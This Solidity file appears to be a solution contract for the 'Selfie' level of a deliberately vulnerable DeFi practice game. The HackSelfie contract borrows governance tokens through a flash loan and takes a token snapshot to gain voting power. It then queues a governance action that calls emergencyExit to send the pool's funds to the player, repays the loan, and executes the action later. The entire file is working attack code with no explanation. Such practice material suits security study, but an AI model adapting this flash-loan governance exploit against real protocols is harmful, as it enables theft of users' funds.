// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./ISimpleGovernance.sol";

interface ISelfiePool {
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);
}

contract HackSelfie is IERC3156FlashBorrower {
    ISelfiePool private pool;
    ISimpleGovernance private governance;
    DamnValuableTokenSnapshot private governanceToken;
    address private player;

    uint256 private myActionId;
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address _pool,
        address _governance,
        address _governanceToken,
        address payable _player
    ) {
        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
        governanceToken = DamnValuableTokenSnapshot(_governanceToken);
        player = _player;
    }

    function makeLoan(uint256 amount) public {
        pool.flashLoan(this, address(governanceToken), amount, bytes(""));
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        // call token snapshot
        governanceToken.snapshot();
        // queue action
        myActionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", player)
        );
        // repay the loan
        governanceToken.approve(address(pool), amount);

        return CALLBACK_SUCCESS;
    }

    function hack() public {
        governance.executeAction(myActionId);
    }
}
